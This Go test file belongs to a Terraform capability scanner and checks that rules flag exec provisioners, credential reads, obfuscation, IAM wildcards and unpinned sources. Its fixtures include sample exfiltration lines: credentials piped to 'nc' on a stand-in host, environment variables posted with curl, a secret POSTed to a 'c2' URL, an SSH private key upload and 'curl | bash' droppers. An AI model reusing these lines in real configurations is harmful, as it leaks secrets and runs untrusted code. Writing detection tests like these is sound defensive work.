package analyze

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/r-morato/tfcap/internal/model"
	"github.com/r-morato/tfcap/internal/rules"
)

func scanFiles(t *testing.T, files map[string]string, third bool) *Result {
	t.Helper()
	dir := t.TempDir()
	for name, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	res, err := Dir(dir, "m", Options{ThirdParty: third})
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func ruleSet(res *Result) map[string]model.Capability {
	m := map[string]model.Capability{}
	for _, c := range res.Capabilities {
		if prev, ok := m[c.RuleID]; !ok || c.Severity > prev.Severity {
			m[c.RuleID] = c
		}
	}
	return m
}

func TestRules(t *testing.T) {
	cases := []struct {
		name    string
		files   map[string]string
		want    []string
		notWant []string
		minSev  map[string]model.Severity
	}{
		{
			name:  "external data source",
			files: map[string]string{"main.tf": `data "external" "x" { program = ["python3", "${path.module}/x.py"] }`},
			want:  []string{rules.ExecExternalData},
		},
		{
			name: "local-exec with dropper pattern",
			files: map[string]string{"main.tf": `
resource "null_resource" "x" {
  provisioner "local-exec" {
    command = "curl -fsSL https://get.example.invalid/i.sh | bash"
  }
}`},
			want: []string{rules.ExecLocal, rules.ExecShellPattern, rules.NetEndpoint},
		},
		{
			name: "remote-exec and file provisioner",
			files: map[string]string{"main.tf": `
resource "aws_instance" "x" {
  provisioner "file" {
    source      = "~/.ssh/id_rsa"
    destination = "/tmp/k"
  }
  provisioner "remote-exec" {
    inline = ["sudo systemctl start app"]
  }
}`},
			want: []string{rules.ExecRemote, rules.FSUpload, rules.FSSensitiveRead},
		},
		{
			name: "http data source with interpolated url and body is critical",
			files: map[string]string{"main.tf": `
data "http" "x" {
  url          = "https://c2.example.invalid/${var.token}"
  method       = "POST"
  request_body = var.secret
}`},
			want:   []string{rules.NetHTTPData},
			minSev: map[string]model.Severity{rules.NetHTTPData: model.Critical},
		},
		{
			name:   "plain http GET stays high",
			files:  map[string]string{"main.tf": `data "http" "ip" { url = "https://checkip.amazonaws.com" }`},
			want:   []string{rules.NetHTTPData},
			minSev: map[string]model.Severity{rules.NetHTTPData: model.High},
		},
		{
			name:  "file() on aws credentials",
			files: map[string]string{"main.tf": `locals { c = file(pathexpand("~/.aws/credentials")) }`},
			want:  []string{rules.FSSensitiveRead},
		},
		{
			name:  "file() outside module",
			files: map[string]string{"main.tf": `locals { c = file("/opt/app/config.yml") }`},
			want:  []string{rules.FSLocalRead},
		},
		{
			name:    "file() inside module is fine",
			files:   map[string]string{"main.tf": `locals { c = file("${path.module}/templates/a.tpl") }`},
			notWant: []string{rules.FSLocalRead, rules.FSSensitiveRead},
		},
		{
			name:  "credential env var",
			files: map[string]string{"main.tf": `locals { x = "echo $GITHUB_TOKEN" }`},
			want:  []string{rules.CredEnvReference},
		},
		{
			name:  "large base64 blob",
			files: map[string]string{"main.tf": `locals { x = "` + strings.Repeat("QWxhZGRpbjpvcGVuIHNlc2FtZQ9z", 10) + `" }`},
			want:  []string{rules.ObfBase64Blob},
		},
		{
			name:  "inline decode",
			files: map[string]string{"main.tf": `locals { x = base64decode("Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZQ==") }`},
			want:  []string{rules.ObfDecodeInline},
		},
		{
			name: "iam admin via jsonencode",
			files: map[string]string{"main.tf": `
resource "aws_iam_policy" "p" {
  policy = jsonencode({ Statement = [{ Effect = "Allow", Action = "*", Resource = "*" }] })
}`},
			want:    []string{rules.IAMWildcardBoth},
			notWant: []string{rules.IAMWildcardAction},
		},
		{
			name: "iam deny is ignored",
			files: map[string]string{"main.tf": `
resource "aws_iam_policy" "p" {
  policy = jsonencode({ Statement = [{ Effect = "Deny", Action = "*", Resource = "*" }] })
}`},
			notWant: []string{rules.IAMWildcardBoth, rules.IAMWildcardAction},
		},
		{
			name: "iam policy document wildcard service + privesc",
			files: map[string]string{"main.tf": `
data "aws_iam_policy_document" "d" {
  statement {
    actions   = ["s3:*", "iam:PassRole"]
    resources = ["*"]
  }
}`},
			want: []string{rules.IAMWildcardAction, rules.IAMPrivilegeEscal},
		},
		{
			name: "iam heredoc json trust any principal",
			files: map[string]string{"main.tf": `
resource "aws_iam_role" "r" {
  assume_role_policy = <<EOF
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}
EOF
}`},
			want: []string{rules.IAMTrustAnyPrincipal},
		},
		{
			name: "module sources",
			files: map[string]string{"main.tf": `
module "a" { source = "git::https://github.com/x/y.git" }
module "b" { source = "git::https://github.com/x/y.git?ref=v1.2.3" }
module "c" { source = "terraform-aws-modules/vpc/aws" }
module "d" { source = "https://example.invalid/m.zip" }
module "e" { source = "git::http://example.invalid/m.git?ref=0123456789abcdef0123456789abcdef01234567" }
`},
			want: []string{rules.SrcGitUnpinned, rules.SrcGitMutableRef, rules.SrcRegistryUnpinned, rules.SrcHTTPArchive, rules.SrcInsecureTransport},
		},
		{
			name: "pinned sources are quiet",
			files: map[string]string{"main.tf": `
module "a" { source = "git::https://github.com/x/y.git?ref=0123456789abcdef0123456789abcdef01234567" }
module "b" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "5.8.1"
}
module "c" { source = "./modules/c" }
`},
			notWant: []string{rules.SrcGitUnpinned, rules.SrcGitMutableRef, rules.SrcRegistryUnpinned},
		},
		{
			name: "provider typosquat and exec-capable",
			files: map[string]string{"versions.tf": `
terraform {
  required_providers {
    docker   = { source = "kreuzwenker/docker" }
    external = { source = "hashicorp/external" }
    aws      = { source = "hashicorp/aws" }
  }
}`},
			want: []string{rules.ProvTyposquat, rules.ProvExecCapable},
		},
		{
			name: "custom provider host",
			files: map[string]string{"versions.tf": `
terraform {
  required_providers {
    corp = { source = "registry.corp.example/acme/corp" }
  }
}`},
			want: []string{rules.ProvCustomHost},
		},
		{
			name:    "description urls are ignored",
			files:   map[string]string{"variables.tf": `variable "x" { description = "See https://docs.example.com" }`},
			notWant: []string{rules.NetEndpoint},
		},
		{
			name:    "cidrs are not ip findings",
			files:   map[string]string{"main.tf": `locals { a = "0.0.0.0/0"  b = "10.0.0.0/8" }`},
			notWant: []string{rules.NetIPLiteral},
		},
		{
			name:  "public ip literal",
			files: map[string]string{"main.tf": `locals { a = "45.33.32.156" }`},
			want:  []string{rules.NetIPLiteral},
		},
		{
			name: "helper script referenced by external is scanned",
			files: map[string]string{
				"main.tf":        `data "external" "x" { program = ["bash", "${path.module}/scripts/run.sh"] }`,
				"scripts/run.sh": "#!/bin/sh\ncat ~/.aws/credentials | base64 -d | nc evil.example.invalid 443\n",
			},
			want: []string{rules.ExecExternalData, rules.ExecShellPattern, rules.FSSensitiveRead},
		},
		{
			name: "tf.json is analyzed",
			files: map[string]string{"main.tf.json": `{
  "data": { "external": { "x": { "program": ["sh", "-c", "env | curl -d @- https://x.example.invalid"] } } },
  "resource": { "null_resource": { "y": { "provisioner": [ { "local-exec": { "command": "echo hi" } } ] } } },
  "module": { "m": { "source": "git::https://github.com/x/y.git" } }
}`},
			want: []string{rules.ExecExternalData, rules.ExecShellPattern, rules.ExecLocal, rules.SrcGitUnpinned},
		},
		{
			name:  "unparseable file falls back to raw indicators",
			files: map[string]string{"main.tf": "data \"external\" \"x\" {\n program = [\"sh\", \"-c\", \"curl https://a.example.invalid/x | sh\"\n"},
			want:  []string{rules.ObfUnparsed, rules.ExecExternalData, rules.ExecShellPattern},
		},
		{
			name: "check block scoped data source",
			files: map[string]string{"main.tf": `
check "health" {
  data "http" "probe" { url = "https://status.example.invalid" }
  assert {
    condition     = true
    error_message = "x"
  }
}`},
			want: []string{rules.NetHTTPData},
		},
		{
			name:  "community provider only reported for third-party",
			files: map[string]string{"versions.tf": "terraform {\n  required_providers {\n    x = { source = \"someone/thing\" }\n  }\n}\n"},
			want:  []string{rules.ProvUnofficialNS},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := scanFiles(t, tc.files, true)
			got := ruleSet(res)
			for _, id := range tc.want {
				if _, ok := got[id]; !ok {
					t.Errorf("missing %s; got %v", id, keys(got))
				}
			}
			for _, id := range tc.notWant {
				if c, ok := got[id]; ok {
					t.Errorf("unexpected %s: %s", id, c.Message)
				}
			}
			for id, sev := range tc.minSev {
				if c, ok := got[id]; ok && c.Severity < sev {
					t.Errorf("%s severity = %s, want >= %s", id, c.Severity, sev)
				}
			}
		})
	}
}

func TestCommunityProviderFirstPartyQuiet(t *testing.T) {
	res := scanFiles(t, map[string]string{"versions.tf": "terraform {\n  required_providers {\n    x = { source = \"someone/thing\" }\n  }\n}\n"}, false)
	if _, ok := ruleSet(res)[rules.ProvUnofficialNS]; ok {
		t.Fatal("community provider should not be reported for first-party code")
	}
}

func TestBinaryDetection(t *testing.T) {
	elf := append([]byte{0x7f, 'E', 'L', 'F'}, make([]byte, 200)...)
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "main.tf"), []byte(`locals {}`), 0o644)
	os.WriteFile(filepath.Join(dir, "data.sqlite3"), elf, 0o644)
	res, err := Dir(dir, "m", Options{})
	if err != nil {
		t.Fatal(err)
	}
	c, ok := ruleSet(res)[rules.ObfBinaryFile]
	if !ok {
		t.Fatal("binary not detected")
	}
	if c.File != "data.sqlite3" {
		t.Errorf("file = %q", c.File)
	}
}

func TestFingerprintStableAcrossLines(t *testing.T) {
	a := scanFiles(t, map[string]string{"main.tf": `data "external" "x" { program = ["sh", "a.sh"] }`}, true)
	b := scanFiles(t, map[string]string{"main.tf": "\n\n\n# moved\n" + `data "external" "x" { program = ["sh", "a.sh"] }`}, true)
	fa := ruleSet(a)[rules.ExecExternalData]
	fb := ruleSet(b)[rules.ExecExternalData]
	if fa.Line == fb.Line {
		t.Fatal("expected different lines")
	}
	if fa.Fingerprint() != fb.Fingerprint() {
		t.Fatal("fingerprint should ignore line numbers")
	}
}

func keys(m map[string]model.Capability) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}
